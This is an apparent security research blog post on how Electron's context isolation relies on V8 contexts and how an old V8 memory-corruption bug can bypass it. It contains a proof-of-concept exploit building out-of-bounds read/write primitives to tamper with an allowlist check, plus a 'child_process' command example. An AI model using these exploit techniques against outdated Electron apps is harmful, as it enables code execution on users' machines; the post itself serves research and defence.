---
title: "Mind the v8 patch gap: Electron's Context Isolation is insecure"
date: 2024-11-03T15:16:18+05:30
draft: false
---

### TL;DR

As I was working on the script for my Discord RCE video, I took another look at Electron security and noticed that a lot of apps don’t fully understand how context isolation works and potential vulnerabilities in context isolation, especially if they’re not regularly updating Electron. I came across a few apps where, with a V8 exploit, you can actually bypass context isolation and access dangerous APIs within the isolated context, APIs that normally wouldn’t be accessible from the main context. In this post, I want to share some insights for both bug hunters and developers on issues they might find around context isolation.


## Chrome isolates: How context isolation works

From Electron documentation, it states context isolation as
- Context Isolation is a feature that ensures that both your preload scripts and Electron's internal logic run in a separate context to the website you load in a webContents. This is important for security purposes as it helps prevent the website from accessing Electron internals or the powerful APIs your preload script has access to.

- This means that the window object that your preload script has access to is actually a different object than the website would have access to. For example, if you set window.hello = 'wave' in your preload script and context isolation is enabled, window.hello will be undefined if the website tries to access it.

The architecture looks as below.

![ciso](/img/ciso.png)

#### Example

Let’s assume a basic Electron app that loads an external page, https://ctf.s1r1us.ninja/jsbin.html. Here’s how we can use context isolation to protect against unauthorized access to Electron’s internal APIs or any sensitive functionality.

*main.js*
```js
const { app, BrowserWindow } = require('electron');
const path = require('path');

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextcontextIsolation: true, // Enable context isolation
      nodeIntegration: false // Disable Node.js integration in renderer
    }
  });

  win.loadURL('https://ctf.s1r1us.ninja/jsbin.html');//[1]
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) createWindow();
});
```

Here’s what each setting does:

- nodeIntegration: false prevents the webpage from directly accessing Node.js APIs, reducing the risk of system access.
- contextIsolation: true ensures that Electron’s internals and any APIs defined in preload scripts remain isolated from the external webpage.

Now, Let’s say we want to give https://ctf.s1r1us.ninja access to a restricted set of modules, but without compromising security. We can achieve this by defining a safeRequire function in our preload script. This function will only allow access to modules with specific names, ensuring that ctf.s1r1us.ninja can’t load unauthorized modules or perform unsafe operations like `require('child_process').exec('calc');`.

 *preload.js*
 ```js
 const { contextBridge } = require('electron');

function safeRequire(name) {
  var regexp = /^only_allow_this_module_[a-z0-9_-]+$/;
  if (!regexp.test(name)) { // only allow specific modules starting with a vlaue
    throw new Error(`"${String(name)}" is not allowed`);
  }
  return require(name);
}

contextBridge.exposeInMainWorld('secureAPI', {
  safeRequire: (name) => safeRequire(name)
});
```

This preload script uses contextBridge.exposeInMainWorld to safely expose safeRequire as window.secureAPI.safeRequire in the renderer. Now, the webpage can only load modules whose names start with only_allow_this_module_, ensuring that access is tightly controlled.

And In https://ctf.s1r1us.ninja/jsbin.html, we can safely use window.secureAPI.safeRequire to load only the allowed modules:

*ctf.s1r1us.ninja/jsbin.html*

```html
  <script>
    document.getElementById('loadModuleButton').addEventListener('click', () => {
      try {
        const module = window.secureAPI.safeRequire('only_allow_this_module_safe-module');
        console.log('Loaded module:', module);
      } catch (error) {
        console.error('Error loading module:', error.message);
      }
    });
  </script>
  ```


## How electron implemented context isolation?

 Electron leverages V8 isolates to create a secure execution environment within each renderer process, preventing web content(ctf.s1r1us.ninja) from directly accessing Electron or Node.js APIs (in preload.js). It is similar to how extensions work and cloudflare's [webworkers](https://developers.cloudflare.com/workers/reference/security-model/) work. 

The source code of it implemenation can be found here. https://github.com/electron/electron/blob/main/shell/renderer/api/electron_api_context_bridge.cc

The minimal version looks as below([unsnipped version](https://gist.github.com/msrkp/1ed54c513caef9f0e0b5cfa9b9c35cde)), you can compile and play around with it.

`$ clang++ hello_world.cc -I. -Iinclude -Lout.gn/main.release/obj -lv8_monolith -o hello_world -std=c++17 -stdlib=libc++ -DV8_COMPRESS_POINTERS -target arm64-apple-macos11 -lpthread&& ./hello_world`

```c++
#include <libplatform/libplatform.h>
#include <v8.h>

#include <iostream>

namespace my_bridge {

const int kMaxRecursion = 1000;

bool DeepFreeze(const v8::Local<v8::Object>& object,
                v8::Local<v8::Context> context) {
 [...]
  }
  return object->SetIntegrityLevel(context, v8::IntegrityLevel::kFrozen)
      .ToChecked();
}

v8::MaybeLocal<v8::Value> PassValueToOtherContext(
    v8::Local<v8::Context> source_context,
    v8::Local<v8::Context> destination_context, v8::Local<v8::Value> value) { //PassValueToOtherContext
  v8::Context::Scope destination_scope(destination_context);
[...]

  if (value->IsObject()) {
    v8::Local<v8::Object> obj = value.As<v8::Object>();
    DeepFreeze(obj, destination_context);
    return obj;
  }

  return v8::MaybeLocal<v8::Value>(value);
}

void ExposeInMainWorld(v8::Isolate* isolate,
                       v8::Local<v8::Context> main_context,
                       v8::Local<v8::Object> object, const std::string& name) {
  v8::Context::Scope main_scope(main_context);
  main_context->Global()
      ->Set(main_context,
            v8::String::NewFromUtf8(isolate, name.c_str()).ToLocalChecked(),
            object)
      .Check();
}
void InitializeContextBridge(v8::Isolate* isolate) {
  v8::HandleScope handle_scope(isolate);

  auto main_context = v8::Context::New(isolate); // [1]
  SetUpConsole(isolate, main_context);
  v8::Global<v8::Context> main_context_global(isolate, main_context);
  isolate->SetData(0, &main_context_global);

  auto isolated_context = v8::Context::New(isolate); // [2]
  SetUpConsole(isolate, isolated_context);
  v8::Context::Scope isolated_scope(isolated_context);

  isolated_context->Global()
      ->Set(isolated_context,
            v8::String::NewFromUtf8(isolate, "ExposeInMainWorld") //[3] contextbridge.ExposeInMainWorld
                .ToLocalChecked(),
            v8::Function::New(
                isolated_context,
                [](const v8::FunctionCallbackInfo<v8::Value>& args) {
                  if (args.Length() < 2 || !args[0]->IsString() ||
                      !args[1]->IsObject()) {
                    args.GetIsolate()->ThrowException(
                        v8::String::NewFromUtf8(args.GetIsolate(),
                                                "Invalid arguments")
                            .ToLocalChecked());
                    return;
                  }

                  v8::Isolate* isolate = args.GetIsolate();
                  v8::String::Utf8Value name(isolate, args[0]);
                  v8::Local<v8::Object> object = args[1].As<v8::Object>();
                  v8::Local<v8::Context> main_context =
                      v8::Local<v8::Context>::New(
                          isolate, *static_cast<v8::Global<v8::Context>*>(
                                       isolate->GetData(0)));
                  my_bridge::ExposeInMainWorld(isolate, main_context, object,
                                               *name);
                })
                .ToLocalChecked())
      .Check();

  const char* isolated_code = R"(
        console.log("In Isolated Context:");
        var regexp = /^only_allow_this_[a-z0-9_-]+$/;
        %DebugPrint(regexp);
        %DebugPrint(regexp.source);
        function requireModule(name) {
             if (regexp.test(name) ) {
                  return false;
              }
              return true;
        }
        const myObject = { name: "isolated_object", requireModule:requireModule}
        ExposeInMainWorld("exposedObject", myObject); //[3]
        %DebugPrint(myObject); 
    
    )"; //preload.js
  v8::Local<v8::String> source =
      v8::String::NewFromUtf8(isolate, isolated_code).ToLocalChecked();
  v8::Local<v8::Script> script;
  if (!v8::Script::Compile(isolated_context, source).ToLocal(&script)) {
    std::cerr << "Failed to compile isolated context script." << std::endl;
    return;
  }
  script->Run(isolated_context).ToLocalChecked();

  const char* main_code = R"( 
        console.log("In Main Context:");
      
   %DebugPrint(exposedObject); 
    console.log(exposedObject.requireModule('test'));    

    )"; //ctf.s1r1us.ninja
  v8::Local<v8::String> main_source =
      v8::String::NewFromUtf8(isolate, main_code).ToLocalChecked();
  v8::Local<v8::Script> main_script;
  if (!v8::Script::Compile(main_context, main_source).ToLocal(&main_script)) {
    std::cerr << "Failed to compile main context script." << std::endl;
    return;
  }
  main_script->Run(main_context).ToLocalChecked();
}

int main(int argc, char* argv[]) {
[...]
  v8::V8::Initialize();

  v8::Isolate::CreateParams create_params;
  create_params.array_buffer_allocator =
      v8::ArrayBuffer::Allocator::NewDefaultAllocator();
  v8::Isolate* isolate = v8::Isolate::New(create_params);

  {
    v8::Isolate::Scope isolate_scope(isolate);
    InitializeContextBridge(isolate);
  }

 [...]
}
```
Electron defines two distinct JavaScript environments—a main context[1] and an isolated context—using[2] V8's isolate mechanism. The isolated context cannot directly access objects or functions from the main context, thus preserving security boundaries. However, a function (ExposeInMainWorld)[3] is defined to expose specific objects from the isolated context to the main context in a controlled manner using PassValueToOtherContext[4].

Few important things to note here
- V8 isolates act as self-contained JavaScript environments, ensuring that code within each isolate can only access its own memory and resources. 
- By separating the JavaScript context of the renderer from the context of Electron internals, context isolation protects against potentially dangerous code from accessing restricted APIs.
- Although isolates create a barrier, Electron provides a secure way to share specific APIs between the isolated renderer and main process using ContextBridge. The ContextBridge allows carefully controlled access to selected functions and data by exposing APIs in a way that maintains isolation, allowing only pre-defined, safe interactions.


## So far so good! What's wrong with it tho?
Although V8 isolates separate JavaScript contexts to prevent direct access across them, a memory corruption bug—like the common Type Confusion, can potentially allow one context to access or manipulate the memory of another. This essentially can be used to bypass Electron’s context isolation. This is a known risk not only in Electron(but it seems most apps are not aware) but also in environments like Cloudflare Workers, which uses V8 isolates for multi-tenant isolation. Cloudflare’s threat model [doc](https://developers.cloudflare.com/workers/reference/security-model/#v8-bugs-and-the-patch-gap) addresses this risk with an impressive 24-hour patch gap, ensuring V8 bugs are swiftly patched. Electron also patches V8 vulnerabilities as soon as they’re available.

However, there’s a catch: while Electron releases new versions promptly, desktop applications often way behind in updating their Electron versions. In our previous Electrovolt research, we exploited this patch gap in numerous applications, revealing how outdated Electron versions leave popular desktop apps open to compromise. You can check it out in detail [here](https://speakerdeck.com/s1r1us/electrovolt-pwning-popular-desktop-apps-while-uncovering-new-attack-surface-on-electron?slide=2). 

But it is still the case. Just Open any Electron app, go to the devtools, and run `navigator.userAgent`. Chances are, it’s running a much older version of Chromium.

### Context Isolation Bypass via V8 Exploit

For a proof of concept, I created [this code](https://gist.github.com/msrkp/6853ffb8d0cb59403744211c7aba8e66) that bypasses context isolation using an old V8 exploit. In the example, I modify the `source` property of `var regexp = /^only_allow_this_module_[a-z0-9_-]+$/;` to arbitrary values using memory corruption bug, essentially bypassing the regular expression checks and enabling access to otherwise restricted modules. This example demonstrates how a memory corruption bug in V8 can be used to circumvent context isolation and execute unintended code.

```c++
  const char* isolated_code = R"(
        console.log("In Isolated Context:");
        var regexp = /^only_allow_this_module_[a-z0-9_-]+$/;
        %DebugPrint(regexp);
        %DebugPrint(regexp.source);
        function requireModule(name) {
             if (regexp.test(name) && name !== 'erlpack') {
                  return false;
              }
              return true;
        }
        const myObject = { name: "isolated_object", requireModule:requireModule}
        ExposeInMainWorld("exposedObject", myObject);
        %DebugPrint(myObject); 
    
    )";
  v8::Local<v8::String> source =
      v8::String::NewFromUtf8(isolate, isolated_code).ToLocalChecked();
  v8::Local<v8::Script> script;
  if (!v8::Script::Compile(isolated_context, source).ToLocal(&script)) {
    std::cerr << "Failed to compile isolated context script." << std::endl;
    return;
  }
  script->Run(isolated_context).ToLocalChecked();

  const char* main_code = R"(
        console.log("In Main Context:");
        let conversion_buffer = new ArrayBuffer(8);
        let float_view = new Float64Array(conversion_buffer);
        let int_view = new BigUint64Array(conversion_buffer);
          BigInt.prototype.hex = function() {
            return '0x' + this.toString(16);
      };
      BigInt.prototype.i2f = function() {
          int_view[0] = this;
          return float_view[0];
      }
      Number.prototype.f2i = function() {
          float_view[0] = this;
          return int_view[0];
      }
      function gc() {
      for(let i=0; i<((1024 * 1024)/0x10); i++) {
        var a = new String();
      }
      }
     

         function f(a) {
            let x = -1; 
            if (a) x = 0xFFFFFFFF;
            let oob_smi = new Array(Math.sign(0 - Math.max(0, x, -1)));
            oob_smi.pop();
            let oob_double = [3.14, 3.14];
            let arr_addrof = [{}];
            let aar_double = [2.17, 2.17];
            let www_double = new Float64Array(0x20);
            return [oob_smi, oob_double, arr_addrof, aar_double, www_double];
        }
  //  gc();
console.log(11)
    for (var i = 0; i < 0x10000; ++i) {
        f(false);
    }
    let [oob_smi, oob_double, arr_addrof, aar_double, www_double] = f(true);
    console.log("[+] oob_smi.length = " + oob_smi.length);
    oob_smi[14] = 0x1234;
    console.log("[+] oob_double.length = " + oob_double.length);
    let primitive = {
        addrof: (obj) => {
            arr_addrof[0] = obj;
            return (oob_double[8].f2i() >> 32n) - 1n;
        },
        half_aar64: (addr) => {
            oob_double[15] = ((oob_double[15].f2i() & 0xffffffff00000000n)
                              | ((addr - 0x8n) | 1n)).i2f();
            return aar_double[0].f2i();
        },
        half_aaw64: (addr, value) => {
            oob_double[15] = ((oob_double[15].f2i() & 0xffffffff00000000n)
                              | ((addr - 0x8n) | 1n)).i2f();
            aar_double[0] = value.i2f(); // Writes `value` at `addr
        },
        full_aaw: (addr, values) => {
            let offset = -1;
            for (let i = 0; i < 0x100; i++) {
                if (oob_double[i].f2i() == 8n*0x20n
                    && oob_double[i+1].f2i() == 0x20n) {
                    offset = i+2;
                    break;
                }
            }
            if (offset == -1) {
                console.log("[-] Bad luck!");
                return;
            } else {
                console.log("[+] offset = " + offset);
            }
            oob_double[offset] = addr.i2f();
            for (let i = 0; i < values.length; i++) {
                console.log(i, www_double[i].f2i().hex(), values[i].f2i().hex());
                www_double[i] = values[i];
            }
        }
    };
    
    exp_addrof = primitive.addrof(exposedObject);
    console.log(exp_addrof.hex());    
    exp_r = primitive.half_aar64(exp_addrof)
console.log(111)
    source_addrof = (exp_r &0xffffffffn) + 353016n;
    console.log("[+] source_addrof : " +source_addrof.hex());
    

    regexp_source = primitive.half_aar64(source_addrof+8n+4n);
    console.log("[+] regexp_source_str: "+regexp_source.hex());

     primitive.full_aaw(0x16bf081dee29n+8n, 0x64726f6373696444n);
     regexp_source = primitive.half_aar64(source_addrof+8n+4n);
    console.log("[+] after regexp_source_str: "+regexp_source.hex());

   %DebugPrint(exposedObject); 
    console.log(exposedObject.requireModule('erlpack'));    

    )";
```


#### PassValueToOtherContext for bug hunters
This is not a issue, but a pointer to bug hunters for to find some interesting context isolation bypass, [PassValueToOtherContext](https://github.com/electron/electron/blob/main/shell/renderer/api/electron_api_context_bridge.cc#L136C27-L136C50) is particularly interesting function, it passes objects from isolated cotnext to main context, if not implemented correctly or missed some behaviour this would allow leaking isolated context objects or fucntions to main cotnext. few example cve
a. [CVE-2023-29198](https://github.com/electron/electron/security/advisories/GHSA-p7v2-p9m8-qqg7) Error thrown in isolated context leaked to main allows bypass. Diff [here](https://github.com/electron/electron/compare/v23.2.1...v23.2.3#diff-678990291ce65586b9e4e509f021d2d699ba5ca164b2a0569c5342c60ab548b4)
b. 3 more context isolation bypass via leaked objects in main context [here](https://github.com/electron/electron/security?page=2)

#### To Developers of Electron Applications
Update Electron Promptly: Always update Electron to the latest version as soon as it’s available. This minimizes the risk from any recently patched vulnerabilities in V8 and Electron. Regular updates are crucial to maintaining the security of your application.

Enable Sandboxing: Use Electron’s sandboxing feature to further reduce the attack surface. By isolating renderer processes, sandboxing adds an extra layer of security that helps contain potential exploits, even in the presence of vulnerabilities.






